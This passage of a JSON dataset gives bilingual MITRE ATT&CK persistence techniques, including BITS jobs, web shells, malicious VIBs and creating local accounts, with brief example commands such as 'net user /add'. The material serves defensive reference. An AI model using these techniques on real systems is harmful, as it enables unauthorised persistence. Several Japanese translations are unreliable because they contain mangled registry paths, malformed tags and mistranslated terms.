                "description_jp": "攻撃者は BITS ジョブを悪用して、コードを持続的に実行したり、さまざまなバックグラウンドタスクを実行したりする可能性がある。Windows Background Intelligent Transfer Service (BITS) は、[Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) を通じて公開される、低帯域幅の非同期ファイル転送メカニズムである。(引用: Microsoft COM)(引用: Microsoft BITS) BITS は、アップデータ、メッセンジャー、および他のネットワークアプリケーションを中断することなくバックグラウンドで動作する(利用可能なアイドル帯域幅を使用する)ことを好む他のアプリケーションによって一般的に使用される。ファイル転送タスクはBITSジョブとして実装され、1つ以上のファイル操作のキューを含む。\n\nBITSジョブを作成および管理するためのインターフェイスは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)および[BITSAdmin](https://attack.mitre.org/software/S0190)ツールからアクセスできます。(引用：Microsoft BITS)(引用：Microsoft BITSAdmin)\n\n攻撃者はBITSを悪用して、悪意のあるコードのダウンロード（[Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)など）、実行、さらには実行後のクリーンアップ（[Indicator Removal](https://attack.mitre.org/techniques/T1070)など）を行う可能性があります。BITSタスクは、BITSジョブデータベース内で自己完結しており、新しいファイルやレジストリを変更することなく、多くの場合、ホストのファイアウォールで許可されています。(引用:CTU BITS Malware June 2016)(引用:Mondok Windows PiggyBack BITS May 2007)(引用:Symantec BITS May 2007) BITSを有効にした実行は、長期間のジョブ(デフォルトの最大寿命は90日で、拡張可能)を作成したり、ジョブが完了またはエラー(システムリブート後を含む)になったときに任意のプログラムを呼び出したりして、永続性を有効にすることもできる(引用:PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITSのアップロード機能を使用して、[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)を実行することもできます(引用: CTU BITS Malware June 2016)。",
                "subtechniques": []
            },
            {
                "id": "T1505",
                "name_eng": "Server Software Component",
                "name_jp": "サーバー・ソフトウェア・コンポーネント",
                "description_eng": "Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)",
                "description_jp": "攻撃者は、サーバの正当な拡張可能な開発機能を悪用して、システムへの永続的なアクセスを確立する可能性があります。エンタープライズサーバアプリケーションには、開発者がメインのアプリケーションの機能を拡張するためのソフトウェアやスクリプトを書いたりインストールしたりできる機能が含まれていることがあります。攻撃者は、サーバーアプリケーションを拡張して悪用するために、悪意のあるコンポーネントをインストールする可能性があります。(引用：volexity_0day_sophos_FW)",
                "subtechniques": [
                    {
                        "id": "T1505.002",
                        "name_eng": "Transport Agent",
                        "name_jp": "輸送代理店",
                        "description_eng": "Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.",
                        "description_jp": "攻撃者はマイクロソフトのトランスポートエージェントを悪用して、システムへの永続的なアクセスを確立する可能性があります。Microsoft Exchangeのトランスポートエージェントは、トランスポートパイプラインを通過する電子メールメッセージに対して動作し、スパムのフィルタリング、悪意のある添付ファイルのフィルタリング、ジャーナリング、すべての送信電子メールの末尾への企業署名の追加など、さまざまなタスクを実行することができます(引用：Microsoft TransportAgent 2016年6月)(引用：ESET LightNeuron 2019年5月) トランスポートエージェントは、アプリケーション開発者によって記述され、その後Exchangeサーバーに登録される.NETアセンブリにコンパイルされます。トランスポートエージェントは、電子メール処理の指定された段階で呼び出され、開発者が定義したタスクを実行します。\n\n敵対者は、悪意のあるトランスポートエージェントを登録することで、敵対者が指定した電子メールイベントによってトリガーできる永続化メカニズムを Exchange Server に提供することができます（引用：ESET LightNeuron May 2019） 悪意のあるトランスポートエージェントは、Exchange トランスポートパイプラインを通過するすべての電子メールに対して呼び出される可能性がありますが、敵対者が定義した基準に対応して特定のタスクのみを実行するようにエージェントを構成することができます。例えば、トランスポートエージェントは、受信者の電子メールアドレスが敵対者によって提供されたリストのエントリと一致する場合にのみ、転送中の添付ファイルをコピーし、後で流出させるために保存するといったアクションを実行することができます。"
                    },
                    {
                        "id": "T1505.004",
                        "name_eng": "IIS Components",
                        "name_jp": "IISコンポーネント",
                        "description_eng": "Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\nAdversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)\n\nAdversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)",
                        "description_jp": "攻撃者は、インターネット・インフォメーション・サービス（IIS）ウェブ・サーバ上で動作する悪意のあるコンポーネントをインストールし、永続性を確立する可能性がある。IIS には、Web サーバの機能を拡張するためのメカニズムがいくつか用意されている。例えば、ISAPI（Internet Server Application Programming Interface）拡張やフィルタをインストールすることで、IISのWebリクエストの送受信を検査したり、変更したりすることができます。拡張とフィルタは、3 つの関数をエクスポートする DLL ファイルとして展開されます：<code>Get{Extension/Filter}Version<//code>, <code>Http{Extension/Filter}Proc<//code>, そして (オプションで) <code>Terminate{Extension/Filter}<//code> です。IIS モジュールは、IIS Web サーバーを拡張するためにインストールすることもできます。(引用: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)\n\n攻撃者は、悪意のある ISAPI 拡張機能およびフィルタをインストールして、トラフィックを監視および/または変更したり、侵害されたマシン上でコマンドを実行したり、コマンドおよび制御トラフィックをプロキシしたりする可能性があります。ISAPI 拡張やフィルタは、IIS のすべての Web リクエストとレスポンスにアクセスできる可能性があります。たとえば、悪意のあるコマンド/コンテンツを事前に構成されたホストに配布するために、敵対者がこれらのメカニズムを悪用して HTTP レスポンスを変更する可能性があります(引用: Microsoft ISAPI Filter Overview 2017)(引用: Microsoft ISAPI Extension Overview 2017)(引用: Microsoft ISAPI Extension All Incoming 2017)(引用: Dell TG-3390)(引用: Trustwave IIS Module 2013)(引用: MMPC ISAPI Filter 2012)\n\n攻撃者はまた、悪意のある IIS モジュールをインストールし、トラフィックを監視および/または変更する可能性があります。IIS 7.0 では、ISAPI 拡張やフィルタと同じように HTTP リクエストとレスポンスに無制限にアクセスできるモジュールが導入されました。IIS モジュールは、<code>RegisterModule</code> をエクスポートする DLL として記述することも、ASP.NET API と連携して IIS HTTP リクエストにアクセスする .NET アプリケーションとして記述することもできます（引用：Microsoft IIS Modules Overview 2007）（引用：Trustwave IIS Module 2013）（引用：ESET IIS Malware 2021）。"
                    },
                    {
                        "id": "T1505.003",
                        "name_eng": "Web Shell",
                        "name_jp": "ウェブシェル",
                        "description_eng": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
                        "description_jp": "攻撃者は、システムへの永続的なアクセスを確立するために、ウェブシェルを使ってウェブサーバをバックドア化することがある。ウェブシェルとは、敵がネットワークへのゲートウェイとしてウェブサーバーにアクセスできるようにするために、一般にアクセス可能なウェブサーバーに配置されるウェブスクリプトのことです。Webシェルは、Webサーバーをホストするシステム上で実行する一連の関数やコマンドラインインターフェースを提供する場合がある(引用：volexity_0day_sophos_FW)。\n\nサーバー側のスクリプトに加えて、Web シェルは、Web サーバーと対話するために使用されるクライアント・インターフェース・プログラムを持つことがあります（例：[China Chopper](https://attack.mitre.org/software/S0020) Web シェル・クライアント）。(引用：Lee 2013)"
                    },
                    {
                        "id": "T1505.005",
                        "name_eng": "Terminal Services DLL",
                        "name_jp": "ターミナルサービスDLL",
                        "description_eng": "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",
                        "description_jp": "攻撃者はターミナルサービスのコンポーネントを悪用し、システムへの永続的なアクセスを可能にする可能性がある。Microsoft Terminal Servicesは、2022年現在、一部のWindows Server OSでRemote Desktop Servicesに改名されており、ホストへのリモート端末接続を可能にする。ターミナルサービスにより、サーバーはRDPを介してクライアントに完全でインタラクティブなグラフィカルユーザーインターフェースを送信できる。\n\n[Windowsサービス](https://attack.mitre.org/techniques/T1543/003)は、「一般的な」プロセス（例：<code>svchost.exe</code>）として実行され、サービスのDLLファイルを読み込みます。その場所は、<code>ServiceDll</code>というレジストリエントリに保存されます。(引用: Microsoft System Services Fundamentals) <code>termsrv.dll</code>ファイルは、通常、`%SystemRoot%System32`に格納され、`HKLMSStimeParameters`のターミナルサービスのデフォルトの<code>ServiceDll</code>値である。\n\n攻撃者は、犠牲となったホストへの永続的なアクセスを可能にするために、ターミナルサービス DLL を変更または置き換える可能性があります。(引用: James TermServ DLL) この DLL への変更は、ターミナルサービスの悪用可能な機能を単に有効にするだけでなく、任意のペイロードを実行するために (通常の <code>termsrv.dll</code> 機能を維持する可能性もあります) 行われる可能性があります。たとえば、<code>termsrv.dll</code> ファイルにパッチを適用するか、<code>ServiceDll</code> の値を変更して RDP 機能を向上させる DLL を指すようにすることで、同時 [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) セッションなどの機能を有効にすることができます。(引用: Windows OS Hub RDP)(引用: RDPWrap Github) 非サーバー Windows OS では、この機能強化により、新しい RDP セッションが作成されたときにシステムのユーザーに警告/ログアウトを促すターミナル サービスのプロンプトを回避できるようになる可能性もあります。"
                    },
                    {
                        "id": "T1505.006",
                        "name_eng": "vSphere Installation Bundles",
                        "name_jp": "vSphereインストール・バンドル",
                        "description_eng": "Adversaries may abuse vSphere Installation Bundles (VIBs) to establish persistent access to ESXi hypervisors. VIBs are collections of files used for software distribution and virtual system management in VMware environments. Since ESXi uses an in-memory filesystem where changes made to most files are stored in RAM rather than in persistent storage, these modifications are lost after a reboot. However, VIBs can be used to create startup tasks, apply custom firewall rules, or deploy binaries that persist across reboots. Typically, administrators use VIBs for updates and system maintenance.\n\nVIBs can be broken down into three components:(Citation: VMware VIBs)\n\n* VIB payload: a `.vgz` archive containing the directories and files to be created and executed on boot when the VIBs are loaded.  \n* Signature file: verifies the host acceptance level of a VIB, indicating what testing and validation has been done by VMware or its partners before publication of a VIB. By default, ESXi hosts require a minimum acceptance level of PartnerSupported for VIB installation, meaning the VIB is published by a trusted VMware partner. However, privileged users can change the default acceptance level using the `esxcli` command line interface. Additionally, VIBs are able to be installed regardless of acceptance level by using the <code> esxcli software vib install --force</code> command. \n* XML descriptor file: a configuration file containing associated VIB metadata, such as the name of the VIB and its dependencies.  \n\nAdversaries may leverage malicious VIB packages to maintain persistent access to ESXi hypervisors, allowing system changes to be executed upon each bootup of ESXi – such as using  `esxcli` to enable firewall rules for backdoor traffic, creating listeners on hard coded ports, and executing backdoors.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022) Adversaries may also masquerade their malicious VIB files as PartnerSupported by modifying the XML descriptor file.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)",
                        "description_jp": "攻撃者は、vSphere Installation Bundles (VIB) を悪用して、ESXi ハイパーバイザーへの永続的なアクセスを確立する可能性があります。VIBは、VMware環境におけるソフトウェアの配布や仮想システムの管理に使用されるファイルの集合体です。ESXi はインメモリ・ファイルシステムを使用しており、ほとんどのファイルに加えられた変更は、永続ストレージではなく RAM に保存されるため、これらの変更は再起動後に失われます。しかし、VIB を使用することで、スタートアップ・タスクの作成、カスタム・ファイアウォール・ルールの適用、または再起動後も持続するバイナリの展開が可能になります。通常、管理者はアップデートとシステム・メンテナンスに VIB を使用します。\n\nVIBは、次の3つのコンポーネントに分けることができます。\n\n* VIBペイロード：VIBがロードされたときにブート時に作成および実行されるディレクトリとファイルを含む`.vgz`アーカイブ。  \n* 署名ファイル：VIB のホストの受け入れレベルを検証するもので、VIB の公開前に VMware またはそのパートナーによってどのようなテストと検証が行われたかを示します。デフォルトでは、ESXi ホストは、VIB のインストールに PartnerSupported という最小の受け入れレベルを必要とします。ただし、特権ユーザは `esxcli` コマンドラインインタフェースを使用してデフォルトのアクセプタンスレベルを変更できます。さらに、<code> esxcli software vib install --force</code> コマンドを使用すると、受け入れレベルに関係なく VIB をインストールできます。\n* XML 記述ファイル: VIB の名前や依存関係など、関連する VIB メタデータを含む設定ファイル。  \n\nたとえば、`esxcli` を使用してバックドア トラフィック用のファイアウォール ルールを有効にしたり、ハードコードされたポートにリスナーを作成したり、バックドアを実行したりします。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022) また、攻撃者は、XML 記述子ファイルを修正することによって、悪意のある VIB ファイルを PartnerSupported として偽装する可能性もあります。(引用: Google Cloud Threat Intelligence ESXi VIBs 2022)"
                    },
                    {
                        "id": "T1505.001",
                        "name_eng": "SQL Stored Procedures",
                        "name_jp": "SQLストアドプロシージャ",
                        "description_eng": "Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)",
                        "description_jp": "攻撃者は、SQLストアド・プロシージャを悪用してシステムへの永続的なアクセスを確立する可能性があります。SQLストアド・プロシージャは、データベース・ユーザーが頻繁に使用するSQLクエリを書き直さなくても済むように、保存して再利用できるコードです。ストアド・プロシージャは、プロシージャ名を使用したデータベースへの SQL 文、または定義されたイベント（SQL サーバー・アプリケーションの起動/再起動時など）を介して呼び出すことができます。\n\n攻撃者は、SQL データベースサーバーの永続化メカニズムを提供できる悪意のあるストアド プロシージャを作成する可能性があります(引用: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) SQL 構文を通じてオペレーティング システム コマンドを実行するには、MSSQL Server 用の xp_cmdshell などの追加機能を有効にする必要があります(引用: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017)\n\nMicrosoft SQL Serverは、共通言語ランタイム（CLR）統合を有効にすることができます。CLR統合を有効にすると、アプリケーション開発者は任意の.NETフレームワーク言語（VB .NET、C#など）を使用してストアドプロシージャを記述できます。(引用：Microsoft CLR Integration 2017) これらのCLRアセンブリは任意のコマンドを実行させることができるため、攻撃者はストアドプロシージャにリンクされているCLRアセンブリを細工または変更する可能性があります。(引用：NetSPI SQL Server CLR)"
                    }
                ]
            },
            {
                "id": "T1668",
                "name_eng": "Exclusive Control",
                "name_jp": "排他制御",
                "description_eng": "Adversaries who successfully compromise a system may attempt to maintain persistence by “closing the door” behind them  – in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system. \n\nFor example, adversaries may patch a vulnerable, compromised system(Citation: Mandiant-iab-control)(Citation: CERT AT Fortinent Ransomware 2025) to prevent other threat actors from leveraging that vulnerability in the future. They may “close the door” in other ways, such as disabling vulnerable services(Citation: sophos-multiple-attackers), stripping privileges from accounts(Citation: aquasec-postgres-processes), or removing other malware already on the compromised device.(Citation: fsecure-netsky)\n\nHindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the “noise” in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case of [Resource Hijacking](https://attack.mitre.org/techniques/T1496), leveraging a compromised device’s full power allows the threat actor to maximize profit.(Citation: sophos-multiple-attackers)",
                "description_jp": "システムの侵害に成功した敵対者は、自分の背後にある「ドアを閉める」ことによって、つまり、他の脅威行為者が同じシステムに最初にアクセスしたり、足場を維持したりすることを阻止することによって、永続性を維持しようとするかもしれない。\n\n例えば、敵対者は、他の脅威行為者が将来その脆弱性を活用することを防ぐために、脆弱性があり侵害されたシステム（引用：Mandiant-iab-control）（引用：CERT AT Fortinent Ransomware 2025）にパッチを適用することがある。また、脆弱性のあるサービスを無効にしたり（引用：sophos-multiple-attackers）、アカウントから権限を剥奪したり（引用：aquasec-postgres-processes）、侵害されたデバイス上にすでに存在する他のマルウェアを削除したりするなど、他の方法で「ドアを閉める」こともあります（引用：fsecure-netsky）。\n\n他の脅威行為者を妨害することで、敵対者は侵害されたシステムやネットワークへの単独アクセスを維持することができます。これにより、脅威行為者は他の脅威行為者と競合する必要がなくなったり、あるいは他の脅威行為者自身によって排除されることもなくなります。また、環境中の「ノイズ」を減らすことで、防御側に捕捉され、退去させられる可能性を低くする。最後に、[Resource Hijacking](https://attack.mitre.org/techniques/T1496)の場合、侵害されたデバイスのフルパワーを活用することで、脅威行為者は利益を最大化することができます。(引用：sophos-multiple-attackers)",
                "subtechniques": []
            },
            {
                "id": "T1136",
                "name_eng": "Create Account",
                "name_jp": "アカウント作成",
                "description_eng": "Adversaries may create an account to maintain access to victim systems.(Citation: Symantec WastedLocker June 2020) With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.\n\nAccounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",
                "description_jp": "攻撃者は、被害者のシステムへのアクセスを維持するためにアカウントを作成する可能性がある。（引用：Symantec WastedLocker June 2020） 十分なレベルのアクセスがあれば、このようなアカウントの作成は、システムに永続的なリモートアクセスツールを展開する必要のない二次的な認証アクセスを確立するために使用される可能性がある。\n\nアカウントはローカル・システム上、またはドメインやクラウド・テナント内に作成することができる。クラウド環境では、敵対者は特定のサービスにのみアクセスできるアカウントを作成することができる。",
                "subtechniques": [
                    {
                        "id": "T1136.003",
                        "name_eng": "Cloud Account",
                        "name_jp": "クラウドアカウント",
                        "description_eng": "Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)\n\nIn addition to user accounts, cloud accounts may be associated with services. Cloud providers handle the concept of service accounts in different ways. In Azure, service accounts include service principals and managed identities, which can be linked to various resources such as OAuth applications, serverless functions, and virtual machines in order to grant those resources permissions to perform various activities in the environment.(Citation: Microsoft Entra ID Service Principals) In GCP, service accounts can also be linked to specific resources, as well as be impersonated by other accounts for [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005).(Citation: GCP Service Accounts) While AWS has no specific concept of service accounts, resources can be directly granted permission to assume roles.(Citation: AWS Instance Profiles)(Citation: AWS Lambda Execution Role)\n\nAdversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.\n\nOnce an adversary has created a cloud account, they can then manipulate that account to ensure persistence and allow access to additional resources - for example, by adding [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) or assigning [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                        "description_jp": "攻撃者は、被害者のシステムへのアクセスを維持するためにクラウドアカウントを作成することがある。十分なレベルのアクセスがあれば、このようなアカウントを使用して、システムに永続的なリモートアクセスツールを展開する必要のない二次的な認証アクセスを確立することができる。 引用：Microsoft O365 Admin Roles）（引用：Microsoft Support O365 Add Another Admin, October 2019）（引用：AWS Create IAM User）（引用：GCP Create Cloud Identity Users）（引用：Microsoft Azure AD Users）。\n\nユーザーアカウントに加えて、クラウドアカウントがサービスに関連付けられることもある。クラウドプロバイダは、サービスアカウントの概念をさまざまな方法で扱っている。Azureでは、サービスアカウントにはサービスプリンシパルとマネージドIDが含まれ、OAuthアプリケーション、サーバーレス機能、仮想マシンなどのさまざまなリソースにリンクすることで、それらのリソースに環境内でさまざまなアクティビティを実行する許可を与えることができる。(引用: Microsoft Entra ID Service Principals) GCPでは、サービスアカウントは特定のリソースにリンクされるだけでなく、[Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)のために他のアカウントになりすますこともできる。(引用: GCP Service Accounts) AWSにはサービスアカウントという特定の概念はないが、リソースに直接ロールを引き受ける権限を付与することができる。(引用: AWS Instance Profiles)(引用: AWS Lambda Execution Role)\n\n攻撃者は、特定のクラウドサービスにのみアクセスできるアカウントを作成する可能性があり、検知の機会を減らすことができる。\n\n一旦敵対者がクラウドアカウントを作成したら、そのアカウントを操作して、例えば[Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)を追加したり、[Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)を割り当てたりして、永続性を確保し、追加リソースへのアクセスを許可することができます。"
                    },
                    {
                        "id": "T1136.001",
                        "name_eng": "Local Account",
                        "name_jp": "ローカルアカウント",
                        "description_eng": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. \n\nFor example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account.  In Linux, the `useradd` command can be used, while on macOS systems, the <code>dscl -create</code> command can be used. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, to ESXi servers via `esxcli system account add`, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                        "description_jp": "攻撃者は、被害者システムへのアクセスを維持するためにローカルアカウントを作成することがある。ローカル・アカウントとは、ユーザ、リモート・サポート、サービス、または単一のシステムまたはサービス上の管理用に組織によって設定されたものである。\n\n例えば、十分なアクセスレベルがあれば、Windowsの<code>net user /add</code>コマンドを使ってローカルアカウントを作成することができる。  Linux では `useradd` コマンドを、macOS システムでは <code>dscl -create</code> コマンドを使うことができる。ローカルアカウントは、多くの場合、<code>username</code>のような一般的な[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)コマンドを介してネットワークデバイスに、`esxcli system account add`を介してESXiサーバに、または`kubectl`ユーティリティを使用してKubernetesクラスタに追加することもできる。(引用: cisco_username_cmd)(引用: Kubernetes Service Accounts Security)\n\nこのようなアカウントは、システム上に永続的なリモートアクセスツールを展開する必要のない、二次的な認証アクセスを確立するために使用することができる。"
                    },
                    {
                        "id": "T1136.002",
                        "name_eng": "Domain Account",
                        "name_jp": "ドメインアカウント",
                        "description_eng": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                        "description_jp": "攻撃者は、被害者のシステムへのアクセスを維持するためにドメインアカウントを作成することがある。ドメインアカウントとは、Active Directoryドメインサービスによって管理されるもので、そのドメインの一部であるシステムやサービス全体でアクセスやパーミッションが設定される。ドメインアカウントには、ユーザーアカウント、管理者アカウント、サービスアカウントがある。十分なアクセスレベルがあれば、<code>net user /add /domain</code>コマンドを使ってドメインアカウントを作成することができる(引用: Savill 1999)\n\nこのようなアカウントは、システムに永続的なリモートアクセスツールを配備する必要のない、二次的な認証されたアクセスを確立するために使われるかもしれない。"
                    }
                ]
            },
            {
                "id": "T1653",
                "name_eng": "Power Settings",
                "name_jp": "電源設定",
                "description_eng": "Adversaries may impair a system's ability to hibernate, reboot, or shut down in order to extend access to infected machines. When a computer enters a dormant state, some or all software and hardware may cease to operate which can disrupt malicious activity.(Citation: Sleep, shut down, hibernate)\n\nAdversaries may abuse system utilities and configuration settings to maintain access by preventing machines from entering a state, such as standby, that can terminate malicious activity.(Citation: Microsoft: Powercfg command-line options)(Citation: systemdsleep Linux)\n\nFor example, `powercfg` controls all configurable power system settings on a Windows system and can be abused to prevent an infected host from locking or shutting down.(Citation: Two New Monero Malware Attacks Target Windows and Android Users) Adversaries may also extend system lock screen timeout settings.(Citation: BATLOADER: The Evasive Downloader Malware) Other relevant settings, such as disk and hibernate timeout, can be similarly abused to keep the infected machine running even if no user is active.(Citation: CoinLoader: A Sophisticated Malware Loader Campaign)\n\nAware that some malware cannot survive system reboots, adversaries may entirely delete files used to invoke system shut down or reboot.(Citation: Condi-Botnet-binaries)",
                "description_jp": "攻撃者は、感染したマシンへのアクセスを拡大するために、システムの休止状態、再起動、シャットダウンの能力を損なうことがある。コンピュータが休止状態に入ると、一部またはすべてのソフトウェアとハードウェアの動作が停止し、悪意のある活動を妨害する可能性がある。 引用：スリープ、シャットダウン、ハイバネート\n\n攻撃者は、システムユーティリティや構成設定を悪用して、マシンがスタンバイ状態などの悪意のある活動を停止できる状態になるのを防ぎ、アクセスを維持する可能性がある(引用: Microsoft: Powercfg コマンドラインオプション)(引用: systemdsleep Linux)\n\n例えば、`powercfg`は、Windowsシステム上で構成可能なすべての電源システム設定を制御し、感染したホストがロックまたはシャットダウンするのを防ぐために悪用される可能性がある(引用：WindowsとAndroidユーザーをターゲットにした2つの新しいMoneroマルウェア攻撃) 敵はまた、システムロック画面のタイムアウト設定を拡張する可能性がある。(引用：BATLOADER: The Evasive Downloader Malware) ディスクやハイバネートのタイムアウトなど、その他の関連する設定も同様に悪用され、ユーザーがアクティブでなくても感染したマシンを実行し続けることができます。 (引用：CoinLoader: A Sophisticated Malware Loader Campaign)\n\nマルウェアの中には、システムの再起動に耐えられないものもあるため、敵対者は、システムのシャットダウンや再起動を呼び出すために使用されるファイルを完全に削除することがあります（引用：Condi-Botnet-binaries）。",
                "subtechniques": []
            },
            {
                "id": "T1556",
                "name_eng": "Modify Authentication Process",
                "name_jp": "認証プロセスの変更",
